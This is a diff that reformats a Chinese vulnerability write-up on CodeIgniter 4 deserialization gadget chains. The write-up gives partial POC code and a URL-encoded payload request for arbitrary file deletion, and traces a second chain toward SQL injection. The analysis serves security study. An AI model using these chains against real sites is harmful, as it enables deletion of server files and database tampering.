@@ -3,9 +3,10 @@
 文章作者提出了一条反序列化的调用链，大体的意思就是通过反序列化，利用恶意的MYSQL服务器来读取服务器文件的效果。这条利用链要求php7.2的环境，其他都不行。要求不可谓不苛刻。
 或许有小伙伴会问，这调利用链前面不是可以构造SQL语句执行吗？为什么不进行SQL注入呢？答案是，这条利用链里面连接的数据库是自己远程的MYSQL，难道自己注自己吗？
 我的目标是找出新的反序列化利用链？可用性要更好的？
+
 0x02 任意文件删除的反序列化利用链
 先直接上POC，如果不想看分析的拿着POC就可以走了。
-<?php
+```<?php
 
 namespace CodeIgniter\Cache\Handlers;
 
@@ -41,17 +42,19 @@ $a = serialize(new \CodeIgniter\Cache\Handlers\RedisHandler(new \CodeIgniter\Ses
 echo $a;
 echo "<hr>";
 echo urlencode($a);
+```
 这条链子比较短，里面只涉及到三个类的调用。
 第一个是/system/Cache/Handlers/RedisHandler.php类的__destruct方法，$this->redis未经合适的验证，直接调用了close方法
-	public function __destruct()
+```	public function __destruct()
 	{
 		if ($this->redis) // @phpstan-ignore-line
 		{
 			$this->redis->close(); //$this->redis未经合适的验证，直接调用了close方法
 		}
 	}
+```
 第二个是/system/Session/Handlers/MemcachedHandler.php类中的close方法，$this->memcached未经过合适的验证，直接调用了delete方法
-	public function close(): bool
+```	public function close(): bool
 	{
 		if (isset($this->memcached))
 		{
@@ -69,13 +72,15 @@ echo urlencode($a);
 
 		return false;
 	}
+```
 第三个是/system/Cache/Handlers/FileHandler.php类中的delete方法，这里面直接进行了unlink操作，且参数$key来源于上一个类中的$this->lockKey。
-	public function delete(string $key)
+```	public function delete(string $key)
 	{
 		$key = $this->prefix . $key;
 
 		return is_file($this->path . $key) && unlink($this->path . $key);
 	}
+```
 这就是一个完整的任意文件删除的反序列化利用链了。下面来利用这个触发点。
 1）增加一个控制器的入口函数，里面包含了反序列化的操作。
 
@@ -93,7 +98,7 @@ http://localhost/codeigniter4/public/index.php/home/testPOST：a=O%3A39%3A%22Cod
 0x03 SQL注入的反序列化利用链
 这条利用链有一些问题，默认情况下CI的类里面不会自动加载配置文件，导致我们不能直接利用这条链来进行SQL注入，仅作学习使用。
 先直接上POC。
-<?php
+```<?php
 
 namespace CodeIgniter\Cache\Handlers;
 
@@ -136,23 +141,25 @@ $a = serialize(new \CodeIgniter\Cache\Handlers\RedisHandler(new \CodeIgniter\Ses
 echo $a;
 echo "<hr>";
 echo urlencode($a);
-
+```
 前面的调用链部分还是和上面的任意文件删除的反序列化调用链相似。
 第一个是/system/Cache/Handlers/RedisHandler.php类的__destruct方法，$this->redis未经合适的验证，直接调用了close方法
-	public function __destruct()
+```	public function __destruct()
 	{
 		if ($this->redis) // @phpstan-ignore-line
 		{
 			$this->redis->close(); //$this->redis未经合适的验证，直接调用了close方法
 		}
 	}
+```
 第二个是\system\Session\Handlers\DatabaseHandler.php类中的close方法，调用了本来的releaseLock方法。
-	public function close(): bool
+```	public function close(): bool
 	{
 		return ($this->lock && ! $this->releaseLock()) ? $this->fail() : true;
 	}
+```
 继续跟踪releaseLock方法，这里的$this->db未经验证的调用了query方法。
-	protected function releaseLock(): bool
+```	protected function releaseLock(): bool
 	{
 		if (! $this->lock)
 		{
@@ -184,8 +191,9 @@ echo urlencode($a);
 		// Unsupported DB? Let the parent handle the simple version.
 		return parent::releaseLock();
 	}
+```
 第三个是\system\Database\BaseConnection.php类中的query方法。由于$this->queryClass可控，查看哪个类实现了setQuery和getQuery方法。最后找到的是\CodeIgniter\Database\Query类。
-	public function query(string $sql, $binds = null, bool $setEscapeFlags = true, string $queryClass = '')
+```	public function query(string $sql, $binds = null, bool $setEscapeFlags = true, string $queryClass = '')
 	{
 		$queryClass = $queryClass ?: $this->queryClass; //可控点
 
@@ -224,9 +232,9 @@ echo urlencode($a);
 			{
 				$this->transStatus = false;
 			}
-
+```
 这里调用了本类的simleQuery方法。里面调用了execute来执行SQL。
-	public function simpleQuery(string $sql)
+```	public function simpleQuery(string $sql)
 	{
 		if (empty($this->connID))
 		{
@@ -235,7 +243,7 @@ echo urlencode($a);
 
 		return $this->execute($sql); //这里就是调用了execute执行sql的位置
 	}
-
+```
 为了调试，我们在execute函数的定义位置下调试断点。简单来看也可以这样输出sql.
 
 
